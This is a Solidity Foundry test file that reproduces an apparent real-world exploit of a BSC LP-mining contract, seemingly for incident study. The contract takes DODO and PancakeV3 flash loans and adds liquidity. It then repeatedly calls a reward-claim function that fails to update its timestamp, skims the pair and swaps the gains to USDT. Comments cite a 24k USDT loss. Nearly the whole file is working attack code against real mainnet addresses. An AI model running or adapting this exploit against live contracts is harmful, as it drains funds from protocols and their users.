// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// reason : Use pair balance to calculate the reward,and not update the time correctly,so can claim reward more times.
// guy    : https://x.com/TenArmorAlert/status/1877030261067571234
// tx     : https://app.blocksec.com/explorer/tx/bsc/0x11c1ef2c61f5a2e41d570a1547d2d891bf916853ddd94e32097e86bcdd21cb4c -->add lp
//        : https://app.blocksec.com/explorer/tx/bsc/0x00c5a772a58b117f142b2cbc8721b80d145ef7a910043ad08439863d0e78e300?line=15333 -->claim reward
// total loss : 24k usdt XD
interface ILPMine {
    function partakeAddLp(uint256 _tokenId,uint256 _tokenAmount, uint256 _usdtAmount,address _oldUser) external;
    function extractReward(uint256 _tokenId) external;
}

contract ContractTest is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address dvm1 = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
    address dvm2 = 0x0e15e47C3DE9CD92379703cf18251a2D13E155A7;
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Pair_V2 pair = Uni_Pair_V2(0xBE2F4D0C39416C7C4157eBFdccB65cc2FF5fb2C4);
    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    address v3pool = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;

    IERC20 ZF = IERC20(0x259A9FB74d6A81eE9b3a3D4EC986F08fbb42121A);
    IERC20 WTO = IERC20(0x692097F0D3Bd0dFBbbbb0EE35000729F05d598f5);
    ILPMine LPMine = ILPMine(0x6BBeF6DF8db12667aE88519090984e4F871e5feb);
    uint256 borrow_1 = 1000 ether;
    uint256 borrow_2 = 500_0000 ether;

    function setUp() external {
        cheats.createSelectFork("bsc", 45583892);
        // attacker buy sor
        deal(address(this),0);
        deal(address(USDT),address(this),0);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] USDT balance before", USDT.balanceOf(address(this)), 18);
        

        (bool success,) = dvm1.call(abi.encodeWithSignature("flashLoan(uint256,uint256,address,bytes)", 0, borrow_1, address(this), "1"));
        require(success, "flashloan failed");

        emit log_named_decimal_uint("[End] USDT balance after", USDT.balanceOf(address(this)), 18);
    }

    function dodoCall(address a, uint256 b, uint256 c, bytes memory d) public {
        console.log("USDT borrow",USDT.balanceOf(address(this)));
        swap_token_to_token(address(USDT), address(ZF), 1000 ether / 2);
        ZF.approve(address(LPMine), ZF.balanceOf(address(this)));
        USDT.approve(address(LPMine), USDT.balanceOf(address(this)));
        LPMine.partakeAddLp(2,ZF.balanceOf(address(this)),500 ether,0x114FAA79157c6Ba61818CE2A383841e56B20250B);
        cheats.warp(block.timestamp + 2 hours);
        (bool success,) = v3pool.call(abi.encodeWithSignature("flash(address,uint256,uint256,bytes)", address(this), borrow_2, 0, ""));
        require(success, "flash failed");
        USDT.transfer(dvm1,borrow_1);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        USDT.transfer(address(pair), USDT.balanceOf(address(this)));
        for(uint i = 0; i < 2000; i++) {
            try LPMine.extractReward(1) {
                // console.log(i,ZF.balanceOf(address(this)));
            } catch {
                continue;
            }
        } 
        ZF.transfer(address(pair),1); //--> ZF token do not allowed zero transfer
        pair.skim(address(this));
        swap_token_to_token(address(ZF), address(USDT), ZF.balanceOf(address(this)));
        swap_token_to_token(address(WTO), address(USDT), WTO.balanceOf(address(this)));
        USDT.transfer(v3pool, borrow_2 + fee0);
    }
    
    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        dodoCall(sender, baseAmount, quoteAmount, data);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        dodoCall(sender, baseAmount, quoteAmount, data);
    }

    function swap_token_to_token(address a, address b, uint256 amount) internal {
        IERC20(a).approve(address(router), amount);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }

    receive() external payable {}
}
